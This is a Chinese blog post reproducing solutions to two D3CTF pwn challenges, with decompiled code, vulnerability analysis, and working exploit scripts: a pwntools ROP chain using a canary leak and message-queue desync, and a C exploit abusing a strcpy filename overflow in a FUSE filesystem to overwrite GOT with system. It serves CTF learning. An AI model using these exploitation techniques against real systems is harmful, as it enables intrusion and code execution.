<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>D3CTF-PWN复现报告 | TokameinE - 雨声淅淅沥沥，犬吠永不止息</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/91110244_p0.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>D3CTF-PWN复现报告</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2022-03-17T04:27:41.000Z" id="date"> 2022-03-17</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-12-29T04:50:34.990Z" id="updated"> 2024-12-29</time></div></span></div></div><hr><div id="post-content"><h2 id="smarCal"><a href="#smarCal" class="headerlink" title="smarCal"></a>smarCal</h2><h3 id="逻辑解读："><a href="#逻辑解读：" class="headerlink" title="逻辑解读："></a>逻辑解读：</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><ul>
<li>Input solver_id&gt;</li>
<li>Input expression</li>
<li>Input result</li>
<li>send_message -&gt;solver_id-&gt;expression-&gt;result</li>
<li>loop</li>
</ul>
<h4 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h4><ul>
<li>get_ID_message</li>
<li>get_expression_message</li>
<li>get_result_message</li>
<li>calculate func</li>
</ul>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>首先，三个input方式是完全相同的：但必须注意的是，它们均要求输入的内容是可打印字符，只有solver_id没有这个检查。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">*&amp;solver_id_len[1] = read(0, solver_id, 0x2010uLL);<br>expression_len = read(0, expression, 0x1F00uLL);<br>result_len = read(0, result, 0x1F00uLL);<br></code></pre></td></tr></table></figure>

<p>而发送消息的函数为sub_70DA：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sub_70DA(dword_C1B0, solver_id, solver_id_len[1]);<br>sub_70DA(dword_C1B0, expression, expression_len);<br>sub_70DA(dword_C1B0, result, result_len);<br></code></pre></td></tr></table></figure>

<p>发送函数如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void __fastcall sub_70DA(int a1, const void *a2, int a3)<br>&#123;<br>  _QWORD *mess_head; // [rsp+18h] [rbp-18h]<br>  _QWORD *mess_body; // [rsp+20h] [rbp-10h]<br>  //分配空间与初始化<br>  mess_head = malloc(0x10uLL);<br>  mess_body = malloc(a3 + 26LL);<br>  memset(mess_head, 0, 0x10uLL);<br>  memset(mess_body, 0, a3 + 26LL);<br>  //mess_head<br>  mess_head[1] = a3;<br>  *mess_head = 1LL;<br>  msgsnd(a1, mess_head, 8uLL, 0);<br>  //mess_body<br>  *mess_body = 2LL;<br>  memcpy(mess_body + 2, a2, a3);<br>  msgsnd(a1, mess_body, a3 + 8LL, 0);<br>  //释放空间<br>  free(mess_head);<br>  free(mess_body);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>流程虽然很清晰，但必须注意到这是在进行进程间通信，其中README中提到：</p>
<blockquote>
<p>sudo sysctl -w kernel.msgmax&#x3D;8192</p>
</blockquote>
<p>这意味着报文长度的限制，对于超出报文的情况会导致入队失败。<br>这一点在之后的利用中会很重要且<strong>难以察觉</strong>，因此笔者提前注出。</p>
<p>笔者猜测的结构体如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">struct mess_head&#123;<br>    int64 type=1;<br>    int64 mess_len;<br>&#125;<br>struct mess_head&#123;<br>    int64 type=2;<br>    int64 mess_len;<br>    char mess_context[mess_len];<br>    char pedding[0xA];<br>&#125;<br></code></pre></td></tr></table></figure>

<p>接下来需要分析fork子进程的流程，首先是接收消息的函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__int64 __fastcall get_message_con(int a1)<br>&#123;<br>  int i; // [rsp+1Ch] [rbp-44h]<br>  void *dest; // [rsp+20h] [rbp-40h] BYREF<br>  __int64 v4; // [rsp+28h] [rbp-38h] BYREF<br>  msgbuf *msgp; // [rsp+30h] [rbp-30h]<br>  void *s; // [rsp+38h] [rbp-28h]<br>  __int64 v7[4]; // [rsp+40h] [rbp-20h] BYREF<br><br>  s = malloc(0x20uLL);<br>  msgp = 0LL;<br>  for ( i = -1; i == -1; i = msgrcv(a1, msgp, *(s + 1) + 8LL, 2LL, 0) )<br>  &#123;<br>    memset(s, 0, 0x20uLL);<br>    msgrcv(a1, s, 8uLL, 1LL, 0);<br>    msgp = malloc(*(s + 1) + 32LL);<br>    memset(msgp, 0, *(s + 1) + 32LL);<br>  &#125;<br>  dest = malloc(*(s + 1));<br>  v4 = *(s + 1);<br>  memset(dest, 0, *(s + 1));<br>  memcpy(dest, &amp;msgp[1], *(s + 1));<br>  free(s);<br>  free(msgp);<br>  sub_73C2(v7, &amp;dest, &amp;v4);<br>  return v7[0];<br>&#125;<br></code></pre></td></tr></table></figure>

<p>阅读起来不太容易，感觉似乎多了些毫无意义的翻译，简而言之就是返回一个指向mess_context内容的chunk。<br>然后就能阅读完整的子进程主函数了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void __fastcall __noreturn sub_68AE(unsigned int a1)<br>&#123;<br>  __int64 v1; // rdx<br>  __int64 v2; // rdx<br>  __int64 v3; // rdx<br>  char *ID; // [rsp+10h] [rbp-60h] BYREF<br>  __int64 v5; // [rsp+18h] [rbp-58h]<br>  void *expression; // [rsp+20h] [rbp-50h] BYREF<br>  __int64 v7; // [rsp+28h] [rbp-48h]<br>  void *result; // [rsp+30h] [rbp-40h] BYREF<br>  __int64 v9; // [rsp+38h] [rbp-38h]<br>  __int64 message_con; // [rsp+40h] [rbp-30h] BYREF<br>  __int64 v11; // [rsp+48h] [rbp-28h]<br>  unsigned __int64 v12; // [rsp+58h] [rbp-18h]<br><br>  while ( 1 )<br>  &#123;<br>    ID = 0LL;<br>    v5 = 0LL;<br>    expression = 0LL;<br>    v7 = 0LL;<br>    result = 0LL;<br>    v9 = 0LL;<br>    message_con = get_message_con(a1);<br>    v11 = v1;<br>    change_pos(&amp;ID, &amp;message_con);<br>    if ( !strncmp(ID, &quot;3x1t&quot;, 4uLL) )<br>      break;<br>    message_con = get_message_con(a1);<br>    v11 = v2;<br>    change_pos(&amp;expression, &amp;message_con);<br>    message_con = get_message_con(a1);<br>    v11 = v3;<br>    change_pos(&amp;result, &amp;message_con);<br>    sub_6493(ID, v5, result, v9, expression, v7);<br>    free(ID);<br>    free(expression);<br>    free(result);<br>  &#125;<br>  sub_708D(a1);<br>  exit(0);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>关键计算发生在sub_6493，但这个函数比较庞大，笔者只截取关键部分（C++反编译出来的代码真的好多啊）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">char expression[280]; // [rsp+130h] [rbp-2120h] BYREF<br>char result[264]; // [rsp+2130h] [rbp-120h] BYREF<br>memcpy(result, input_result, a5);<br>memcpy(expression, input_expression, a7);<br>write(1, result, a5 + 64);<br></code></pre></td></tr></table></figure>

<p>反汇编代码没有很好的体现出变量a5是result的长度，笔者也没有从汇编细究，但从函数逻辑的角度来说，这么想是一种直觉，它意味着我们会打印除result外更多的数据，这能让我们泄露canary。<br>再回顾主函数发送消息时，获取result的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">result_len = read(0, result, 0x1F00uLL);<br></code></pre></td></tr></table></figure>

<p>注意到result的长度，我们可以读入足够多数据使其泄露。</p>
<h3 id="Attack-Test"><a href="#Attack-Test" class="headerlink" title="Attack Test"></a>Attack Test</h3><p>尝试泄露数据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sla(&quot;solver_id&quot;,b&quot;1&quot;)<br>sla(&quot;expression&quot;,b&quot;1&quot;)<br>#用足够长的result去填充数组，使得write函数泄露额外数据<br>PAYLOAD_SZ=0x2238-0x2130<br>sla(&quot;result&quot;,b&quot;1&quot;*(PAYLOAD_SZ-1)) # pedding+&#x27;\x0a&#x27;#<br>p.recvuntil(b&#x27;result is:&#x27;)<br>p.recv(2)<br>p.recv(PAYLOAD_SZ)<br>canary=p.recv(8)#leak canary<br>p.recv(8*3)<br>leak1=u64(p.recv(8))#leak addr<br>elf_base=leak1-0x55f4136819c5+0x000055f41367d000-0x2000#<br>csu=elf_base+0x7470#csu gadget<br></code></pre></td></tr></table></figure>

<p>接下来构造ROP链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">g=p64(0)*3+p64(elf_base+0x748a)+p64(0)+p64(1)+p64(1)+p64(read_got)+p64(8)+p64(write_got)<br>#write(1,read_got,8)<br>g+=p64(csu)+p64(0)+p64(0)+p64(1)+p64(0)+p64(elf_base+0xC1A0)+p64(24)+p64(read_got)<br>#read(0, malloc_got,8)<br>g+=p64(csu)+p64(0)+p64(0)+p64(1)+p64(elf_base+0xC1A0+8)+p64(0)+p64(0)+p64(elf_base+0xC1A0)<br>g+=p64(prdi_ret+1)+p64(prdi_ret)+p64(elf_base+0xC1A0+8)+p64(elf_base+0x7479)<br>#read(0,bss,size)<br></code></pre></td></tr></table></figure>

<p>在构造完成以后，我们就需要期望将ROP写进返回地址以期望事情顺利发展。<br>但我们知道，能够用以溢出的result或者expression被要求输入必须是<strong>可打印的</strong>，因此这里就需要通过报文长度限制来抢占，使得输入ID这个不被检查的过程中导入了result或者expression。<br>常规发送情况如下：</p>
<ul>
<li>ID 1-&gt;expression 1-&gt;result 1-&gt;ID 2</li>
</ul>
<p>而接收顺序如下：</p>
<ul>
<li>ID 1-&gt;expression 1-&gt;result 1-&gt;ID 2</li>
</ul>
<p>接下来我们通过输入长ID来使得报文无法入队，使得接收报文的实际内容变为：</p>
<ul>
<li>expression 1-&gt;result 1 -&gt; ID 2</li>
</ul>
<p>这样，第二次发送的ID 2就会被当作result，并且还不会经过可打印检查。</p>
<p>所以exp接下来这样做：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sa(&quot;solver_id&quot;,b&quot;a&quot;*8200)#长报文，不被接收<br>sa(&quot;expression&quot;,b&quot;a&quot;) #短报文，会被当作ID接收<br>sa(&quot;result&quot;,b&quot;1+1&quot;) #短报文，被当作expression接收<br><br>sa(&quot;solver_id&quot;,b&quot;a&quot;*PAYLOAD_SZ+canary+rop)#短报文，被当作result接收，但在发送端会认为发送的是ID<br>sa(&quot;expression&quot;,b&quot;1&quot;) #ID <br>sa(&quot;result&quot;,b&quot;2+1&quot;)#expression<br></code></pre></td></tr></table></figure>

<p>最后就只需要顺应rop结束即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#rop中构造了读取函数，会将malloc_got改为system，最后执行对应代码读出flag<br>p.send(p64(leak-libc.sym[&#x27;read&#x27;]+libc.sym[&#x27;system&#x27;])+b&#x27;cat flag&#x27;.ljust(16,b&#x27;\x00&#x27;))<br>p.interactive()<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="d3fuse"><a href="#d3fuse" class="headerlink" title="d3fuse"></a>d3fuse</h2><p>题目是一个fuse文件系统，这里不对其做过多的赘述，一言蔽之就是：</p>
<blockquote>
<p>一个能够让用户自定义操作的，用户态的文件系统。</p>
</blockquote>
<p>阅读脚本可以知道，&#x2F;chroot&#x2F;mnt目录被该文件系统接管，所有在该目录下的操作会由d3fuse进行变换。<br>以及，flag是根目录下，但程序一开始会用chroot将当前根目录切换到chroot，无法直接向上层访问。</p>
<h3 id="保护检查"><a href="#保护检查" class="headerlink" title="保护检查"></a>保护检查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Arch:     amd64-64-little<br>RELRO:    Partial RELRO<br>Stack:    Canary found<br>NX:       NX enabled<br>PIE:      No PIE (0x400000)<br></code></pre></td></tr></table></figure>

<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>首先根据查阅的资料恢复符号，可以看到该程序接管了如下命令：(部分未标记)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0000000000404CC0 off_404CC0      dq offset getattr       ; DATA XREF: main+49↑o<br>.data.rel.ro:0000000000404CD8                 dq offset mkdir<br>.data.rel.ro:0000000000404CE0                 dq offset unlink<br>.data.rel.ro:0000000000404CE8                 dq offset rmdir<br>.data.rel.ro:0000000000404CF8                 dq offset rename<br>.data.rel.ro:0000000000404D18                 dq offset truncate<br>.data.rel.ro:0000000000404D20                 dq offset open<br>.data.rel.ro:0000000000404D28                 dq offset read<br>.data.rel.ro:0000000000404D30                 dq offset write<br>.data.rel.ro:0000000000404D40                 dq offset sub_401ABA<br>.data.rel.ro:0000000000404D48                 dq offset sub_4016E5<br>.data.rel.ro:0000000000404D78                 dq offset opendir<br>.data.rel.ro:0000000000404D80                 dq offset readdir<br>.data.rel.ro:0000000000404D88                 dq offset sub_4017BE<br>.data.rel.ro:0000000000404D98                 dq offset init_<br>.data.rel.ro:0000000000404DA0                 dq offset sub_401918<br>.data.rel.ro:0000000000404DA8                 dq offset sub_401927<br>.data.rel.ro:0000000000404DB0                 dq offset create<br>.data.rel.ro:0000000000404E08 _data_rel_ro    ends<br></code></pre></td></tr></table></figure>

<p>首先从创建文件的部分开始看，注意到其调用<strong>sub_401D74</strong>函数，其中有一行漏洞代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">v12 = strdup(a2);<br>s2 = __xpg_basename(v12);<br>strcpy(&amp;v15-&gt;ptr[48 * v8], s2);<br></code></pre></td></tr></table></figure>

<p>strcpy是不限定长度的拷贝，而s2是文件名，而文件名一般能无限长，因此可以构成一个溢出。<br>然后根据代码反推文件的结构体：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">struct fusefile<br>&#123;<br>    char name[32];<br>    int file_type;<br>    unsigned int subsize;<br>    char *ptr;<br>&#125;;<br>//sizeof(fusefile)=48<br></code></pre></td></tr></table></figure>

<p>那么名字就能够向下溢出了。</p>
<p>那么顺着创建文件的路，从open开始：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__int64 __fastcall open(__int64 a1, __int64 fd)<br>&#123;<br>  int v3; // [rsp+14h] [rbp-Ch]<br>  fusefile *v4; // [rsp+18h] [rbp-8h]<br><br>  v4 = find_file(&amp;byte_4050C0, a1);<br>  if ( !v4 )<br>    return 4294967294LL;<br>  if ( (v4-&gt;file_type &amp; 1) != 0 )<br>    return 4294967275LL;<br>  if ( (*fd &amp; 0x200) != 0 )<br>  &#123;<br>    v3 = sub_401C4E(v4, 0LL);<br>    if ( v3 &lt; 0 )<br>      return v3;<br>  &#125;<br>  *(fd + 16) = v4;<br>  return 0LL;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>其会寻找该文件并返回其描述符。</p>
<p>然后是read函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">size_t __fastcall read(__int64 a1, void *a2, size_t a3, __int64 a4, __int64 a5)<br>&#123;<br>  __int64 offset; // [rsp+10h] [rbp-30h]<br>  size_t n; // [rsp+18h] [rbp-28h]<br>  fusefile *v8; // [rsp+38h] [rbp-8h]<br><br>  n = a3;<br>  offset = a4;<br>  v8 = *(a5 + 16);<br>  if ( a4 &gt; v8-&gt;subsize )<br>    offset = v8-&gt;subsize;<br>  if ( a3 + offset &gt; v8-&gt;subsize )<br>    n = v8-&gt;subsize - offset;<br>  memcpy(a2, &amp;v8-&gt;ptr[offset], n);<br>  return n;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>会从描述符的ptr处复制数据到指针。</p>
<p>然后是write：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">size_t __fastcall write(__int64 a1, const void *a2, size_t a3, __int64 a4, __int64 a5)<br>&#123;<br>  __int64 offset; // [rsp+10h] [rbp-40h]<br>  unsigned int size; // [rsp+3Ch] [rbp-14h]<br>  fusefile *size_4; // [rsp+40h] [rbp-10h]<br>  char *v10; // [rsp+48h] [rbp-8h]<br><br>  offset = a4;<br>  size_4 = *(a5 + 16);<br>  if ( a4 &gt; size_4-&gt;subsize )<br>    offset = size_4-&gt;subsize;<br>  size = offset + a3;<br>  if ( (offset + a3) &gt; size_4-&gt;subsize )<br>  &#123;<br>    v10 = realloc(size_4-&gt;ptr, size);<br>    if ( !v10 )<br>      return 4294967284LL;<br>    size_4-&gt;ptr = v10;<br>    size_4-&gt;subsize = size;<br>  &#125;<br>  memcpy(&amp;size_4-&gt;ptr[offset], a2, a3);<br>  return a3;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>将数据复制到ptr指向的内容处。</p>
<h3 id="Attack-Test-1"><a href="#Attack-Test-1" class="headerlink" title="Attack Test"></a>Attack Test</h3><p>利用思路：</p>
<ul>
<li>通过文件名溢出ptr为got表</li>
<li>读取ptr泄露got内容，得到libc_base</li>
<li>写got表为system</li>
<li>令system执行“cp &#x2F;flag &#x2F;chroot&#x2F;flag”</li>
</ul>
<p>笔者最开始还在好奇，为什么chroot之后，system还能用根目录下的cp来拷贝flag，原因出自sh脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">runuser -u ctf /d3fuse /chroot/mnt &amp;&amp; \<br>chroot --userspec=1000:1000 /chroot /bin/timeout -k 5 300 /bin/sh<br></code></pre></td></tr></table></figure>

<p>最开始没注意到f3fuse是运行在外部，之后再chroot的，所以该文件是能正常访问外部目录的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//musl-gcc -static -o exp exp.c<br>#include &lt;unistd.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;string.h&gt;<br>int main()&#123;<br>/*<br>&#123;<br> .name = &#x27;A&#x27;*32;<br> .isdir = 0x10101010;<br> .length = 0x1101010;<br> .context = 0x405070;<br>*/<br>    char* fpath = &quot;/mnt/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10\x10\x10\x10\x10\x10\x10\x01pP@\x00&quot;;<br>    char* cmd = &quot;/usr/bin/cp /flag /chroot/rwdir/flag&quot;;<br>    int fd, r;<br>    // call realloc<br>    char garbage[0x1000];<br>    memset(garbage, 0x1000, &#x27;A&#x27;);<br>    fd = open(&quot;/mnt/garbage&quot;, O_CREAT O_WRONLY O_DIRECT);<br>    write(fd, garbage, 0x1000);<br>    close(fd);<br>    fd = open(&quot;/mnt/cmd&quot;, O_CREAT O_WRONLY O_DIRECT);<br>    write(fd, cmd, strlen(cmd));<br>    close(fd);<br>    // trigger strcpy vuln<br>    fd = open(fpath, O_CREATO_WRONLY O_DIRECT);<br>    if(fd &lt; 0)<br>        perror(&quot;open&quot;);<br>    close(fd);<br>    // leak realloc address<br>    fd = open(&quot;/mnt/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;, O_RDWR  O_DIRECT);<br>    unsigned long libc_addr = 0;<br>    r = read(fd, &amp;libc_addr, 8);<br>    if(r &lt; 0)<br>        perror(&quot;read&quot;);<br>    printf(&quot;read: fd=%d, r=%d, libc=%lx\n&quot;, fd, r, libc_addr);<br>    // calculate system address<br>    libc_addr += -0x48bf0;<br>    // overwrite realloc GOT address to system<br>    lseek(fd, 0, 0);<br>    r = write(fd, &amp;libc_addr, 8);<br>    if(r &lt; 0)<br>        perror(&quot;write&quot;);<br>    printf(&quot;write: fd=%d, r=%d, libc=%lx\n&quot;, fd, r, libc_addr);<br>    // call system(cmd)<br>    fd = open(&quot;/mnt/cmd&quot;, O_WRONLY O_DIRECT);<br>    write(fd, garbage, 0x1000);<br>    close(fd);<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<p>注：<br>pwn的其他题也看了一下，kheap和内核slub分配器看着难度还行，但我目前还没学到那，之后完成了会另外再复现一下试试的。<br>bpf的wp看了好几篇，但对于我这样最开始就没接触bpf的菜鸡来说好像还是有些晦涩，尤其是那个超长的exp，看着有点头皮发麻，希望之后有时间的话把这个东西从头再做一遍，ebf这个东西对我这个希望未来能研究内核的新手来说相当有吸引力。<br>希望接下来也能继续精进吧。</p>
<hr>
<p>插画ID:71759763</p>
